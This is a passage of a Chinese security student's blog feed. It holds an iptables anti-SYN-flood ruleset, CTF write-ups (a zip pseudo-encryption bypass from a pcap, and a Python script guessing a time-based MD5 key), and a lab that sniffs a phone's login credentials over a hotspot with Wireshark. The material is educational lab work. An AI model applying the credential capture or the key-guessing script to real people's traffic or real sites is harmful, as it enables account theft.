class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">iptables –F</span><br><span class="line"></span><br><span class="line">  iptables –X</span><br><span class="line"></span><br><span class="line">  iptables -P INPUT DROP</span><br><span class="line"></span><br><span class="line">  iptables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line">  iptables -P FORWARD DROP</span><br><span class="line"></span><br><span class="line">  iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line"></span><br><span class="line">  iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"></span><br><span class="line">  iptables -A OUTPUT -p icmp -j ACCEPT (OUTPUT设置成DROP的话)</span><br><span class="line"></span><br><span class="line">  iptables -A INPUT -p icmp -j ACCEPT (INPUT设置成DROP的话)</span><br><span class="line"></span><br><span class="line">  iptables -A INPUT -i lo -p all -j ACCEPT (如果是INPUT DROP)</span><br><span class="line"></span><br><span class="line">  iptables -A OUTPUT -o lo -p all -j ACCEPT(如果是OUTPUT DROP)</span><br><span class="line"></span><br><span class="line">  iptables -N syn-flood</span><br><span class="line"></span><br><span class="line">  iptables -A INPUT -p tcp --syn -j syn-flood</span><br><span class="line"></span><br><span class="line">  iptables -I syn-flood -p tcp -m limit --limit 3/s --limit-burst 6 -j RETURN</span><br><span class="line"></span><br><span class="line">  iptables -A syn-flood -j REJECT</span><br><span class="line"></span><br><span class="line">  iptables -A INPUT -i eth0 -p tcp --syn -m connlimit --connlimit-above 15 -j DROP</span><br><span class="line"></span><br><span class="line">  iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line"></span><br><span class="line">  iptables -A INPUT  -p tcp --syn -m limit --limit 12/s --limit-burst 24 -j ACCEPT</span><br><span class="line"></span><br><span class="line">  iptables -A FORWARD -p tcp --syn -m limit --limit 1/s -j ACCEPT</span><br><span class="line"></span><br><span class="line">  /etc/rc.d/init.d/iptables save</span><br><span class="line"></span><br><span class="line">  service iptables restart</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.zsythink.net/archives/1199&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;iptables详解（1）：iptables概念&lt;/a&gt;   （必看，看到4就差不多了）&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.centos.bz/2018/01/iptables%e6%9f%a5%e7%9c%8b%e3%80%81%e5%bc%80%e6%94%be%e3%80%81%e5%88%a0%e9%99%a4%e7%ab%af%e5%8f%a3%e3%80%81%e4%bf%9d%e5%ad%98%e8%ae%be%e7%bd%ae/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;iptables查看、开放、删除端口、保存设置&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;0xFF-iptables介绍&quot;&gt;&lt;a href=&quot;#0xFF-iptables介绍&quot; class=&quot;headerlink&quot; title=&quot;0xFF iptables介绍&quot;&gt;&lt;/a&gt;0xFF iptables介绍&lt;/h4&gt;&lt;p&gt;iptables其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫netfilter。&lt;/p&gt;
&lt;p&gt;netfilter才是防火墙真正的安全框架（framework），netfilter位于内核空间。&lt;/p&gt;
&lt;p&gt;iptables其实是一个命令行工具，位于用户空间，我们用这个工具操作真正的框架。&lt;/p&gt;
&lt;p&gt;netfilter/iptables（下文中简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。&lt;/p&gt;
&lt;h4 id=&quot;0x00-查看规则表&quot;&gt;&lt;a href=&quot;#0x00-查看规则表&quot; class=&quot;headerlink&quot; title=&quot;0x00 查看规则表&quot;&gt;&lt;/a&gt;0x00 查看规则表&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;iptables -t filter -L INPUT --line-numbers  //查看filter表的INPUT链中的所有规则，同时显示每天规则的顺序号&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;iptables -t filter -L&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;iptables -t raw -L&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;iptables -t mangle -L&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;iptables -t nat -L&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://blog.Lhaihai.wang/categories/Linux/"/>
    
    
      <category term="iptables" scheme="http://blog.Lhaihai.wang/tags/iptables/"/>
    
  </entry>
  
  <entry>
    <title>博客提交百度谷歌收录</title>
    <link href="http://blog.Lhaihai.wang/2018/04/28/%E5%8D%9A%E5%AE%A2%E6%8F%90%E4%BA%A4%E7%99%BE%E5%BA%A6%E8%B0%B7%E6%AD%8C%E6%94%B6%E5%BD%95/"/>
    <id>http://blog.Lhaihai.wang/2018/04/28/博客提交百度谷歌收录/</id>
    <published>2018-04-28T15:40:16.000Z</published>
    <updated>2018-04-28T17:10:07.664Z</updated>
    
    <content type="html"><![CDATA[<p>留个坑，以后再慢慢写</p><a id="more"></a><h5 id="Hexo-Next主题博客提交百度谷歌收录"><a href="#Hexo-Next主题博客提交百度谷歌收录" class="headerlink" title="Hexo+Next主题博客提交百度谷歌收录"></a><a href="https://blog.csdn.net/hosea1008/article/details/53384382" target="_blank" rel="noopener">Hexo+Next主题博客提交百度谷歌收录</a></h5><p><a href="https://blog.csdn.net/sunshine940326/article/details/70936988" target="_blank" rel="noopener">hexo高阶教程：想让你的博客被更多的人在搜索引擎中搜到吗？</a></p><p><a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">https://hexo.io/docs/deployment.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;留个坑，以后再慢慢写&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>啦啦啦WriteUp</title>
    <link href="http://blog.Lhaihai.wang/2018/04/28/%E5%95%A6%E5%95%A6%E5%95%A6WriteUp/"/>
    <id>http://blog.Lhaihai.wang/2018/04/28/啦啦啦WriteUp/</id>
    <published>2018-04-28T10:57:53.000Z</published>
    <updated>2018-04-28T17:05:41.711Z</updated>
    
    <content type="html"><![CDATA[<h3 id="解题链接："><a href="#解题链接：" class="headerlink" title="解题链接："></a>解题链接：</h3><p><a href="http://ctf5.shiyanbar.com/misc/LOL/LOL.pcapng" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/misc/LOL/LOL.pcapng</a> </p><h3 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h3><p>隐藏在数据包中的秘密</p><a id="more"></a><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>用wireshark打开，过滤http，有两个post请求，发现有lol.zip,lol.docs</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E5%AE%9E%E9%AA%8C%E5%90%A7/%E5%95%A6%E5%95%A6%E5%95%A6WriteUp.assets/1524913276909.png" alt="1524913276909"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E5%AE%9E%E9%AA%8C%E5%90%A7/%E5%95%A6%E5%95%A6%E5%95%A6WriteUp.assets/1524913339533.png" alt="1524913339533"></p><p>右键-&gt;追踪流-&gt;TCP</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E5%AE%9E%E9%AA%8C%E5%90%A7/%E5%95%A6%E5%95%A6%E5%95%A6WriteUp.assets/1524913435741.png" alt="1524913435741"></p><p>把PK开始的数据复制粘贴到010 Editor，先转为原始数据再复制粘贴，去掉无关的数据</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E5%AE%9E%E9%AA%8C%E5%90%A7/%E5%95%A6%E5%95%A6%E5%95%A6WriteUp.assets/1524913556720.png" alt="1524913556720"></p><p>保存为ok.zip</p><p>解压需要密码</p><p>zip文件用winhex看一下，会发现头上的加密位是未加密的状态，那么肯定就是在文件目录区所修改的伪加密了。</p><p>果不其然，在文件目录区修改伪加密位即可解压文件。</p><p>参考下面图片</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E5%AE%9E%E9%AA%8C%E5%90%A7/%E5%95%A6%E5%95%A6%E5%95%A6WriteUp.assets/1524913944180.png" alt="1524913944180"></p><p>这个题目具体位置如下，四个都要改，就可以解压成功，有四个txt文件</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E5%AE%9E%E9%AA%8C%E5%90%A7/%E5%95%A6%E5%95%A6%E5%95%A6WriteUp.assets/1524914946181.png" alt="1524914946181"></p><p>txt文件打开，前面都是89504E47 </p><p>PNG (png)文件头：89504E47 </p><p>直接改后缀发现打不开，复制文本的数据，粘贴至Winhex，存储为.png文件</p><p>打开发现得到了四个二维码，将其拼接起来</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E5%AE%9E%E9%AA%8C%E5%90%A7/%E5%95%A6%E5%95%A6%E5%95%A6WriteUp.assets/1524915682266.png" alt="1524915682266"></p><p>最后一步，扫码得到flag</p><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="http://fuliang.iteye.com/blog/769680" target="_blank" rel="noopener">常见文件类型识别</a></p><p><a href="https://blog.csdn.net/pdsu161530247/article/details/73612910" target="_blank" rel="noopener">zip伪加密破解方法</a></p><p><a href="https://blog.csdn.net/ETF6996/article/details/51946250" target="_blank" rel="noopener">zip伪加密</a></p><h3 id="伪加密知识点："><a href="#伪加密知识点：" class="headerlink" title="伪加密知识点："></a>伪加密知识点：</h3><h5 id="一个-ZIP-文件由三个部分组成："><a href="#一个-ZIP-文件由三个部分组成：" class="headerlink" title="一个 ZIP 文件由三个部分组成："></a>一个 ZIP 文件由三个部分组成：</h5><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p><ul><li><strong>压缩源文件数据区：</strong><br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度</li><li><strong>压缩源文件目录区：</strong><br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</li><li><strong>压缩源文件目录结束标志：</strong><br>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;解题链接：&quot;&gt;&lt;a href=&quot;#解题链接：&quot; class=&quot;headerlink&quot; title=&quot;解题链接：&quot;&gt;&lt;/a&gt;解题链接：&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://ctf5.shiyanbar.com/misc/LOL/LOL.pcapng&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://ctf5.shiyanbar.com/misc/LOL/LOL.pcapng&lt;/a&gt; &lt;/p&gt;
&lt;h3 id=&quot;hint&quot;&gt;&lt;a href=&quot;#hint&quot; class=&quot;headerlink&quot; title=&quot;hint&quot;&gt;&lt;/a&gt;hint&lt;/h3&gt;&lt;p&gt;隐藏在数据包中的秘密&lt;/p&gt;
    
    </summary>
    
      <category term="Misc" scheme="http://blog.Lhaihai.wang/categories/Misc/"/>
    
      <category term="实验吧" scheme="http://blog.Lhaihai.wang/categories/Misc/%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
    
    
      <category term="Misc" scheme="http://blog.Lhaihai.wang/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>MD5之守株待兔，你需要找到和系统锁匹配的钥匙</title>
    <link href="http://blog.Lhaihai.wang/2018/04/28/MD5%E4%B9%8B%E5%AE%88%E6%A0%AA%E5%BE%85%E5%85%94%EF%BC%8C%E4%BD%A0%E9%9C%80%E8%A6%81%E6%89%BE%E5%88%B0%E5%92%8C%E7%B3%BB%E7%BB%9F%E9%94%81%E5%8C%B9%E9%85%8D%E7%9A%84%E9%92%A5%E5%8C%99/"/>
    <id>http://blog.Lhaihai.wang/2018/04/28/MD5之守株待兔，你需要找到和系统锁匹配的钥匙/</id>
    <published>2018-04-28T08:26:21.000Z</published>
    <updated>2018-04-28T08:45:07.561Z</updated>
    
    <content type="html"><![CDATA[<h4 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接:"></a>题目链接:</h4><p><a href="http://ctf5.shiyanbar.com/misc/keys/keys.php?key=d41d8cd98f00b204e9800998ecf8427e" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/misc/keys/keys.php?key=d41d8cd98f00b204e9800998ecf8427e</a></p><h4 id="hint："><a href="#hint：" class="headerlink" title="hint："></a>hint：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从系统锁下手，通过get方式key字段提交答案，直到您的钥匙与系统锁相等则成功。</span><br><span class="line">格式：CTF&#123;&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>时间戳md5后生成的密钥</p><p>直接上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(src)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(src)</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTime</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(int(time.time())<span class="number">-2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">(Unixtime)</span>:</span></span><br><span class="line">    url=<span class="string">'http://ctf5.shiyanbar.com/misc/keys/keys.php?key='</span>+Unixtime</span><br><span class="line">    r=requests.get(url)</span><br><span class="line">    print(r.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    getFlag(getTime())</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>刚开始都是false</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&apos;\r\n\r\nfalse&lt;br&gt;\xcf\xb5\xcd\xb3\xb5\xc4\xc3\xdc\xd4\xbf=b5acfe0daa101b0b4c5f2f8bdf834038&lt;br&gt;\xc4\xfa\xb5\xc4\xc3\xdc\xd4\xbf=57ec220296a9d7e1316c086a90185a0b&apos;</span><br></pre></td></tr></table></figure><p>这是因为time.time()拿到的时间戳跟实验吧的时间戳有点延迟</p><p>拿出来的<code>b5acfe0daa101b0b4c5f2f8bdf834038</code>和<code>57ec220296a9d7e1316c086a90185a0b</code></p><p>到<a href="https://www.md5online.org/去解密一下" target="_blank" rel="noopener">https://www.md5online.org/去解密一下</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Found : 1524904334</span><br><span class="line">(hash = b5acfe0daa101b0b4c5f2f8bdf834038)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Found : 1524904333</span><br><span class="line">(hash = 57ec220296a9d7e1316c086a90185a0b)</span><br></pre></td></tr></table></figure><p>发现本地的时间慢了一秒，就在time.time()后+1</p><p>根据自己的时间调整一下</p><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>假的flag，自己跑跑代码吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\r\n\r\n&lt;script&gt;alert(&apos;flagxxxxxxxx&apos;)&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://www.jianshu.com/p/e4b8fd7dda08" target="_blank" rel="noopener">https://www.jianshu.com/p/e4b8fd7dda08</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; title=&quot;题目链接:&quot;&gt;&lt;/a&gt;题目链接:&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;http://ctf5.shiyanbar.com/misc/keys/keys.php?key=d41d8cd98f00b204e9800998ecf8427e&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://ctf5.shiyanbar.com/misc/keys/keys.php?key=d41d8cd98f00b204e9800998ecf8427e&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;hint：&quot;&gt;&lt;a href=&quot;#hint：&quot; class=&quot;headerlink&quot; title=&quot;hint：&quot;&gt;&lt;/a&gt;hint：&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;从系统锁下手，通过get方式key字段提交答案，直到您的钥匙与系统锁相等则成功。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;格式：CTF&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Misc" scheme="http://blog.Lhaihai.wang/categories/Misc/"/>
    
      <category term="实验吧" scheme="http://blog.Lhaihai.wang/categories/Misc/%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
    
    
      <category term="Misc" scheme="http://blog.Lhaihai.wang/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>网络安全实验链接</title>
    <link href="http://blog.Lhaihai.wang/2018/04/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E9%93%BE%E6%8E%A5/"/>
    <id>http://blog.Lhaihai.wang/2018/04/27/网络安全实验链接/</id>
    <published>2018-04-27T11:51:46.000Z</published>
    <updated>2018-04-30T17:03:04.903Z</updated>
    
    <content type="html"><![CDATA[<p>实验一 流量捕获实验</p><p>实验二 <a href="http://blog.lhaihai.wang/2018/05/01/TCP-IP/">TCP/IP协议攻击</a></p><p>实验三 CA证书与SSL连接(DJ的资料已经很详细了，我就不放出了)</p><p>实验四 <a href="http://blog.lhaihai.wang/2018/04/29/iptables%E5%AD%A6%E4%B9%A0/">配置主机防火墙防止Dos攻击</a></p><p>​     后面Dos攻击还需要实验一下</p><p>实验六 <a href="http://blog.lhaihai.wang/2018/04/27/Nessus%E5%88%9D%E6%AD%A5%E4%BD%BF%E7%94%A8/">综合扫描</a></p><p>实验五 <a href="http://blog.lhaihai.wang/2018/04/27/%E6%8D%95%E8%8E%B7%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F/">WiFi钓鱼</a></p><p>实验七 <a href="http://blog.lhaihai.wang/2018/04/27/%E5%90%88%E5%A4%A9%E7%9A%84%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80%E5%AE%9E%E9%AA%8C/">XSS跨站脚本攻击</a></p><p>实验八 <a href="http://blog.lhaihai.wang/2018/04/27/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%EF%BC%9ADVWA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/">SQL注入攻击</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;实验一 流量捕获实验&lt;/p&gt;
&lt;p&gt;实验二 &lt;a href=&quot;http://blog.lhaihai.wang/2018/05/01/TCP-IP/&quot;&gt;TCP/IP协议攻击&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;实验三 CA证书与SSL连接(DJ的资料已经很详细了，我就不放出了)&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Wireshark捕获手机流量</title>
    <link href="http://blog.Lhaihai.wang/2018/04/27/%E6%8D%95%E8%8E%B7%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F/"/>
    <id>http://blog.Lhaihai.wang/2018/04/27/捕获手机流量/</id>
    <published>2018-04-27T11:39:14.000Z</published>
    <updated>2018-04-27T11:56:52.717Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>windows10</p><h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><p>设置——&gt;网络和Internet——&gt;移动热点——&gt;开启</p><a id="more"></a><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E6%8D%95%E8%8E%B7%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F.assets/1524751006768.png" alt="1524751006768"></p><p>手机连上移动热点，被分配到的IP地址是192.168.137.248</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E6%8D%95%E8%8E%B7%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F.assets/1524756700558.png" alt="52475670055"></p><p>手机在一个网址登陆</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E6%8D%95%E8%8E%B7%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F.assets/Screenshot_2018-04-26-23-58-49-881_com.android.ch.png" alt="Screenshot_2018-04-26-23-58-49-881_com.android.ch"></p><p>然后在站长之家查询一下域名的ip地址</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E6%8D%95%E8%8E%B7%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F.assets/1524756655669.png" alt="52475665566"></p><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP:121.42.137.89</span><br></pre></td></tr></table></figure><p>Wireshark过滤一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.137.248 and ip.addr == 121.42.137.89 and http</span><br></pre></td></tr></table></figure><p>过滤得到</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E6%8D%95%E8%8E%B7%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F.assets/1524756571807.png" alt="52475657180"></p><p>查看Post请求，在HTML表单可以查看到提交的用户名和密码</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E6%8D%95%E8%8E%B7%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F.assets/1524756518739.png" alt="52475651873"></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h4&gt;&lt;p&gt;windows10&lt;/p&gt;
&lt;h4 id=&quot;实验过程&quot;&gt;&lt;a href=&quot;#实验过程&quot; class=&quot;headerlink&quot; title=&quot;实验过程&quot;&gt;&lt;/a&gt;实验过程&lt;/h4&gt;&lt;p&gt;设置——&amp;gt;网络和Internet——&amp;gt;移动热点——&amp;gt;开启&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
